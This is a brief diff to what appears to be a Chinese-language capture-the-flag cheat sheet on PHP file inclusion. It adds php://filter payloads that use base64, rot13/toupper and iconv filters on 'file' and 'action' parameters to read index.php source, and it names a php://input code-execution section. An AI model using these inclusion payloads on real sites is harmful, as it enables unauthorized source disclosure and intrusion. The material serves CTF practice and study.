@@ -41,7 +41,9 @@ file:///var/www/html/flag
 ## php://filter读取源码
 
 ```
-?file=php://filter/read=convert.base64-encode/resource=flag.php
+?file=php://filter/read=convert.base64-encode/resource=index.php
+?action=php://filter/read=string.toupper|string.rot13/resource=index.php
+?action=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=index.php
 ```
 ## php://input执行代码
 
